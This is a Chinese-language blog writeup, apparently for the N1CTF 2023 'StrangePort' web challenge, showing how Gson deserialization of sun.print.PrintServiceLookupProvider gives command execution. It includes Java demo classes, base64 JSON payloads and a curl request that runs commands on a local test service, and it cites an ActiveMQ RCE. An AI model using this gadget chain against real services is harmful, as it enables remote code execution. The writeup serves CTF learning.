<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>N1CTF 2023 Web 赛后复现 Writeup - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="N1CTF 2023 Web 赛后复现 Writeup - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2023/11/06/N1CTF%202023%20Web%20%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0%20Writeup/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-11-06T08:34:16.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/WriteUp/">WriteUp</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>November</span>
            <span>6,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">N1CTF 2023 Web 赛后复现 Writeup</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h1 id="StrangePort"><a href="#StrangePort" class="headerlink" title="StrangePort"></a>StrangePort</h1><p>考点：ApacheMQ、Gson反序列化<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1698914410852-619ee936-c427-4757-8564-573040be007a.png#averageHue=%23222f37&clientId=uf8b8dddb-1e6c-4&from=paste&height=192&id=uff87f81f&originHeight=240&originWidth=1229&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=52803&status=done&style=none&taskId=ueac7f18d-96af-4dc2-8278-66dcec9ab1c&title=&width=983.2" alt="image.png"><br>内网服务中起了一个apachemq+springboot项目，然后用nginx反代做一个不出网的处理。我们首先分析springboot服务。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1698914571720-10609d28-f1cf-430d-a70e-02b752f6d640.png#averageHue=%2353575e&clientId=uf8b8dddb-1e6c-4&from=paste&height=470&id=u53a12c1e&originHeight=588&originWidth=1396&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=713681&status=done&style=none&taskId=u8b80f05b-0c73-4bbb-856a-b14f172dace&title=&width=1116.8" alt="image.png"><br>只给了一个Api路由，目的很单纯就是Gson反序列化，那我们首先需要考虑如何Rce。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.google.gson.Gson;</span><br><span class="line"><span class="keyword">import</span> sun.print.PrintServiceLookupProvider;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Objects;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GsonDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, ClassNotFoundException, IOException &#123;</span><br><span class="line">        String Json=<span class="string">&quot;eyJscGNBbGxDb20iOlsidG91Y2ggL3RtcC9hYWFhYSIsInRvdWNoIC90bXAvYWFhYWEiXX0=&quot;</span>;</span><br><span class="line">        String Person=<span class="string">&quot;Person&quot;</span>;</span><br><span class="line">        <span class="type">Gson</span> <span class="variable">gson</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Gson</span>();</span><br><span class="line">        <span class="type">Person</span> <span class="variable">o</span> <span class="operator">=</span> (Person) gson.fromJson(<span class="keyword">new</span> <span class="title class_">String</span>(Base64.getDecoder().decode(Json), StandardCharsets.UTF_8), Class.forName(Person));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>其中Json的base64随便给给，我们调试分析一下流程，理解一下Gson反序列化的特点</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="number">1111</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;john&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">age</span> <span class="operator">=</span> <span class="string">&quot;11&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;name=&#x27;&quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;&#x27;, age=&#x27;&quot;</span> + <span class="built_in">this</span>.age + <span class="string">&quot;&#x27;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, String age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    Object <span class="title function_">writeReplace</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(String age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1698914983103-a3bc0c95-004d-4d4c-a9aa-0b98aafa34f8.png#averageHue=%23485054&clientId=uf8b8dddb-1e6c-4&from=paste&height=804&id=u7102046e&originHeight=1005&originWidth=2072&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1812366&status=done&style=none&taskId=u1abea7e2-0153-4a29-be76-c5fc11d2244&title=&width=1657.6" alt="image.png"><br>当我们的反序列化对象有构造方法时，他会直接调用<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1698914997029-e65f4fae-9d18-48ed-99f7-e41aa7e1fcb6.png#averageHue=%23626571&clientId=uf8b8dddb-1e6c-4&from=paste&height=150&id=u583e3bfd&originHeight=188&originWidth=998&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=148228&status=done&style=none&taskId=u80fd983c-b362-46bb-9a9e-739692bf954&title=&width=798.4" alt="image.png"><br>假如没有构造方法，他就会进行unsafe实例化<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1698915037024-f7431980-fbcd-49d1-a3f2-336f0bdbb483.png#averageHue=%23495057&clientId=uf8b8dddb-1e6c-4&from=paste&height=986&id=u83aed090&originHeight=1233&originWidth=2397&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2366154&status=done&style=none&taskId=u52958f9d-9a5b-4066-aee8-cfae63c9802&title=&width=1917.6" alt="image.png"><br>那么知道这一个特性后我们就可以去思考一下怎么rce了，我们需要找到的调用链也就是constructor-&gt;Runtime.exec，当时打比赛的时候脑子没转过来，赛后才想起来Linux服务器下有很多UnixPrinter类，其中只要是一个方法基本都有命令拼贴，从而导致Rce，今天我们用到的类是<code>PrintServiceLookupProvider</code>，其实不是这个类也可以，实测实现了<code>PrintServiceLookup</code>的类都可以，他们的构造方法里都会新建一个while true的线程，不断的执行方法。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1698915186017-71804638-585a-4c35-958c-7360d232f0e2.png#averageHue=%231e2023&clientId=uf8b8dddb-1e6c-4&from=paste&height=445&id=ub6645e5f&originHeight=556&originWidth=1584&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=70800&status=done&style=none&taskId=u815b6722-e4f2-4b26-a053-78e13092fdc&title=&width=1267.2" alt="image.png"><br>因此我们可以写一个小Demo方便我们去理解。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;whoami&quot;</span>+age);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;john&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">age</span> <span class="operator">=</span> <span class="string">&quot;11&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;name=&#x27;&quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;&#x27;, age=&#x27;&quot;</span> + <span class="built_in">this</span>.age + <span class="string">&quot;&#x27;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, String age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(String age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里person类的构造方法明显存在一个命令拼贴，我们传入payload<code>&#123;&quot;name&quot;:&quot;qwq&quot;,age:&quot;;touch /tmp/pwned&quot;&#125;</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1698915525237-4efcc70e-06ff-40c6-a628-71908c127938.png#averageHue=%231f2024&clientId=uf8b8dddb-1e6c-4&from=paste&height=162&id=u799b87f8&originHeight=203&originWidth=1027&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=46895&status=done&style=none&taskId=ubb5da68d-a7ac-4cb9-bb03-624ed46aa25&title=&width=821.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1698915522234-89ccf862-7692-41b3-a81d-fc0b7dbd457e.png#averageHue=%234d5561&clientId=uf8b8dddb-1e6c-4&from=paste&height=182&id=u85cbea47&originHeight=228&originWidth=1191&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=385542&status=done&style=none&taskId=u1bcaa1dd-e5a9-4910-aa7e-f29375cd52d&title=&width=952.8" alt="image.png"><br>可以发现person的age属性还是默认的11，所以这里咱们单纯的放一个命令拼贴是不行的，之前提到的PrintService是会新建一个线程，进行一个重复循环如下。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Writer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">RceThread</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(age);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Person</span>.RceThread(),</span><br><span class="line">                <span class="string">&quot;Rce&quot;</span>, <span class="number">0</span>, <span class="literal">false</span>);</span><br><span class="line">        thr.setDaemon(<span class="literal">true</span>);</span><br><span class="line">        thr.start();</span><br><span class="line">       &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;john&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">age</span> <span class="operator">=</span> <span class="string">&quot;11&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;name=&#x27;&quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;&#x27;, age=&#x27;&quot;</span> + <span class="built_in">this</span>.age + <span class="string">&quot;&#x27;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, String age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(String age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.google.gson.Gson;</span><br><span class="line"><span class="keyword">import</span> sun.print.PrintServiceLookupProvider;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.print.PrintServiceLookup;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Objects;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GsonDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, ClassNotFoundException, IOException &#123;</span><br><span class="line"><span class="comment">//        String Json=&quot;eyJscGNBbGxDb20iOlsidG91Y2ggL3RtcC9hYWFhYSIsInRvdWNoIC90bXAvYWFhYWEiXX0=&quot;;</span></span><br><span class="line"><span class="comment">//        String Person=&quot;sun.print.PrintServiceLookupProvider&quot;;</span></span><br><span class="line">        String Json=<span class="string">&quot;eyJuYW1lIjoicXdxIixhZ2U6InRvdWNoIC90bXAvcHduZWQifQ==&quot;</span>;</span><br><span class="line">        String Person=<span class="string">&quot;Person&quot;</span>;</span><br><span class="line">        <span class="type">Gson</span> <span class="variable">gson</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Gson</span>();</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="type">Person</span> <span class="variable">o</span> <span class="operator">=</span> (Person) gson.fromJson(<span class="keyword">new</span> <span class="title class_">String</span>(Base64.getDecoder().decode(Json), StandardCharsets.UTF_8), Class.forName(Person));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1698916889495-a54299a8-36e1-4a09-b615-928564eb7228.png#averageHue=%2323262b&clientId=uf8b8dddb-1e6c-4&from=paste&height=841&id=u2d5e4231&originHeight=1051&originWidth=2162&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=194483&status=done&style=none&taskId=u025192ce-4b8f-4bd2-99b7-0db4fdbbaea&title=&width=1729.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1698916900757-076731ca-47be-4480-994a-2268dcc01f07.png#averageHue=%233f4b5b&clientId=uf8b8dddb-1e6c-4&from=paste&height=137&id=u1103fb23&originHeight=171&originWidth=572&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=154477&status=done&style=none&taskId=u425bf44c-be08-4d7d-a14a-b2235ca92f3&title=&width=457.6" alt="image.png"><br>rce成功了~<br>那我们现在回到题解，我们看看这个内部类的逻辑<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1698916967733-2898f85a-8a98-4b82-92b3-411bdd536e94.png#averageHue=%231f2024&clientId=uf8b8dddb-1e6c-4&from=paste&height=300&id=u80ea3ba0&originHeight=375&originWidth=1067&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=47011&status=done&style=none&taskId=uf79736b8-7df8-43e8-80d9-c972efb8bcc&title=&width=853.6" alt="image.png"><br>经过调试会发现会执行方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1698916990868-b281e006-1454-43a7-b573-f5b54008d197.png#averageHue=%23202125&clientId=uf8b8dddb-1e6c-4&from=paste&height=843&id=u1c8fb8a9&originHeight=1054&originWidth=2204&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=251119&status=done&style=none&taskId=u9a102987-123f-4b7f-99a7-92549a1cda1&title=&width=1763.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1698916995724-d4b41725-859d-40b9-a86e-972ab188ebbc.png#averageHue=%231f2024&clientId=uf8b8dddb-1e6c-4&from=paste&height=241&id=uc4d038dc&originHeight=301&originWidth=946&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=33255&status=done&style=none&taskId=u52283c66-9452-4b69-9310-4914f23296e&title=&width=756.8" alt="image.png"><br>这里执行了execCmd，对外部类的属性进行了命令拼贴，所以一个简易的poc如下<br><code>&#123;&quot;lpcAllCom&quot;:[&quot;touch /tmp/aaaaa&quot;,&quot;touch /tmp/aaaaa&quot;]&#125;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://127.0.0.1:8877/api/sun.print.PrintServiceLookupProvider/eyJscGNBbGxDb20iOlsidG91Y2ggL3RtcC9hYWFhYSIsInRvdWNoIC90bXAvYWFhYWEiXX0=</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1698917133991-fa5f6423-dded-4529-b7b2-98b10e710da5.png#averageHue=%23040301&clientId=uf8b8dddb-1e6c-4&from=paste&height=144&id=ue50abc4a&originHeight=180&originWidth=1313&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=19166&status=done&style=none&taskId=u6d0568e6-0bd2-4224-8f2b-7609e5fc9a6&title=&width=1050.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1698917141193-3aa854bd-bfc0-4199-86de-3a48dd6727f8.png#averageHue=%23010100&clientId=uf8b8dddb-1e6c-4&from=paste&height=131&id=u3a403c03&originHeight=164&originWidth=929&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=39250&status=done&style=none&taskId=u4678cdbb-b8fa-43bc-b35f-ca2833277e8&title=&width=743.2" alt="image.png"><br> 成功执行了命令。说明poc成立，那我们继续往外看apachemq，apachemq最近出了个0day，可以利用Cpx类加载恶意xml导致rce，但是条件是出网，可是本题不出网，我们可以从RCE改为ssrf- -<br>可以参考<br><a target="_blank" rel="noopener" href="https://exp10it.cn/2023/10/apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-rce-%E5%88%86%E6%9E%90/">Apache ActiveMQ (版本 &lt; 5.18.3) RCE 分析</a><br>X1roz师傅写的比较详细，也是很棒的一篇文章，太强了呀（有点佩服）<br>我们需要利用apachemq的队列知识给他外带出来。这里参考了一手nese战队的poc</p>
